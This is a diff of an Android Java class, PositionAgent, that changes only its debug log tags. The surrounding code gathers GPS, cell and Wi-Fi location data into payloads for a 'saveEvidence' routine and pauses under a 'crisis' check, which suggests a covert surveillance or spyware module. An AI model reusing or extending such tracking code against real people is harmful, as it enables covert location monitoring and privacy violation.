@@ -83,7 +83,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 				gpsEnabled = ((type & TYPE_GPS) != 0);
 			} else {
 				// #ifdef DEBUG
-				Log.d(TAG, "Warn: " + "GPS Disabled at compile time");
+				Log.d("QZ", TAG + " Warn: " + "GPS Disabled at compile time");
 				// #endif
 			}
 			cellEnabled = ((type & TYPE_CELL) != 0);
@@ -96,11 +96,11 @@ public class PositionAgent extends AgentBase implements LocationListener {
 			// #endif
 
 			// #ifdef DEBUG
-			Log.d(TAG, "Info: " + "Type: " + type);
-			Log.d(TAG, "Info: " + "Period: " + period);
-			Log.d(TAG, "Info: " + "gpsEnabled: " + gpsEnabled);
-			Log.d(TAG, "Info: " + "cellEnabled: " + cellEnabled);
-			Log.d(TAG, "Info: " + "wifiEnabled: " + wifiEnabled);
+			Log.d("QZ", TAG + " Info: " + "Type: " + type);
+			Log.d("QZ", TAG + " Info: " + "Period: " + period);
+			Log.d("QZ", TAG + " Info: " + "gpsEnabled: " + gpsEnabled);
+			Log.d("QZ", TAG + " Info: " + "cellEnabled: " + cellEnabled);
+			Log.d("QZ", TAG + " Info: " + "wifiEnabled: " + wifiEnabled);
 			// #endif
 
 			setPeriod(period);
@@ -108,7 +108,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 
 		} catch (final IOException e) {
 			// #ifdef DEBUG
-			Log.d(TAG, "Error: " + e.toString());
+			Log.d("QZ", TAG + " Error: " + e.toString());
 			// #endif
 			return false;
 		}
@@ -120,25 +120,25 @@ public class PositionAgent extends AgentBase implements LocationListener {
 	public void go() {
 
 		if (Status.self().crisisPosition()) {
-			Log.d(TAG, "Warn: " + "Crisis!");
+			Log.d("QZ", TAG + " Warn: " + "Crisis!");
 			return;
 		}
 
 		if (gpsEnabled) {
 			// #ifdef DEBUG
-			Log.d(TAG, "actualRun: gps");
+			Log.d("QZ", TAG + " actualRun: gps");
 			// #endif
 			locationGPS();
 		}
 		if (cellEnabled) {
 			// #ifdef DEBUG
-			Log.d(TAG, "actualRun: cell");
+			Log.d("QZ", TAG + " actualRun: cell");
 			// #endif
 			locationCELL();
 		}
 		if (wifiEnabled) {
 			// #ifdef DEBUG
-			Log.d(TAG, "actualRun: wifi");
+			Log.d("QZ", TAG + " actualRun: wifi");
 			// #endif
 			locationWIFI();
 		}
@@ -152,7 +152,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 
 		if (wifi != null && wifi.getBSSID() != null) {
 			// #ifdef DEBUG
-			Log.d(TAG, "Info: " + "Wifi: " + wifi.getBSSID());
+			Log.d("QZ", TAG + " Info: " + "Wifi: " + wifi.getBSSID());
 			// #endif
 			final byte[] payload = getWifiPayload(wifi.getBSSID(),
 					wifi.getSSID(), wifi.getRssi());
@@ -166,7 +166,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 			// logWifi.close();
 		} else {
 			// #ifdef DEBUG
-			Log.d(TAG, "Warn: " + "Wifi disabled");
+			Log.d("QZ", TAG + " Warn: " + "Wifi disabled");
 			// #endif
 		}
 
@@ -180,7 +180,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 
 		CellInfo info = Device.getCellInfo();
 		if (!info.valid) {
-			Log.d(TAG, "Error: " + "invalid cell info");
+			Log.d("QZ", TAG + " Error: " + "invalid cell info");
 			return;
 		}
 
@@ -198,18 +198,18 @@ public class PositionAgent extends AgentBase implements LocationListener {
 
 	private void locationGPS() {
 		if (locator == null) {
-			Log.d(TAG, "Error: " + "GPS Not Supported on Device");
+			Log.d("QZ", TAG + " Error: " + "GPS Not Supported on Device");
 			return;
 		}
 
 		if (lastLocation == null) {
-			Log.d(TAG, "waitingForPoint");
+			Log.d("QZ", TAG + " waitingForPoint");
 
 			return;
 		}
 
 		// #ifdef DEBUG
-		Log.d(TAG, "newLocation");
+		Log.d("QZ", TAG + " newLocation");
 		// #endif
 
 		byte[] payload;
@@ -217,7 +217,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 			final long timestamp = lastLocation.getTime();
 
 			// #ifdef DEBUG
-			Log.d(TAG, "valid");
+			Log.d("QZ", TAG + " valid");
 			// #endif
 			payload = getGPSPayload(lastLocation, timestamp);
 			lastLocation = null;
@@ -240,7 +240,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 		if (location != null) {
 			double lat = location.getLatitude();
 			double lng = location.getLongitude();
-			Log.d(TAG, "lat: " + lat + " lon:" + lng);
+			Log.d("QZ", TAG + " lat: " + lat + " lon:" + lng);
 		}
 		synchronized (this) {
 			lastLocation = location;
@@ -290,7 +290,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 		// #endif
 
 		// #ifdef DEBUG
-		Log.d(TAG, "saveEvidence payload: " + payload.length);
+		Log.d("QZ", TAG + " saveEvidence payload: " + payload.length);
 		// #endif
 
 		final int version = 2008121901;
@@ -327,7 +327,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 	}
 
 	private byte[] getWifiPayload(String bssid, String ssid, int signalLevel) {
-		Log.d(TAG, "getWifiPayload bssid: " + bssid + " ssid: " + ssid
+		Log.d("QZ", TAG + " getWifiPayload bssid: " + bssid + " ssid: " + ssid
 				+ " signal:" + signalLevel);
 		final int size = 48;
 		final byte[] payload = new byte[size];
@@ -360,7 +360,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 		}
 
 		// #ifdef DEBUG
-		Log.d(TAG, "getWifiPayload ssidcontent.length: " + ssidcontent.length);
+		Log.d("QZ", TAG + " getWifiPayload ssidcontent.length: " + ssidcontent.length);
 		// #endif
 		databuffer.writeInt(ssidcontent.length);
 
@@ -431,7 +431,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 	 */
 	private byte[] getGPSPayload(Location loc, long timestamp) {
 		// #ifdef DEBUG
-		Log.d(TAG, "getGPSPayload");
+		Log.d("QZ", TAG + " getGPSPayload");
 		// #endif
 		final Date date = new Date(timestamp);
 
@@ -443,7 +443,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 		final float speed = loc.getSpeed();
 		final float course = loc.getBearing();
 
-		Log.d(TAG, "" + " " + speed + "|" + latitude + "|" + longitude + "|"
+		Log.d("QZ", TAG + " " + " " + speed + "|" + latitude + "|" + longitude + "|"
 				+ course + "|" + date);
 
 		final DateTime dateTime = new DateTime(date);
@@ -501,7 +501,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 		databuffer.write(new byte[48]); // sn view
 
 		// #ifdef DEBUG
-		Log.d(TAG, "len: " + databuffer.getPosition());
+		Log.d("QZ", TAG + " len: " + databuffer.getPosition());
 		// #endif
 
 		// #ifdef DBC
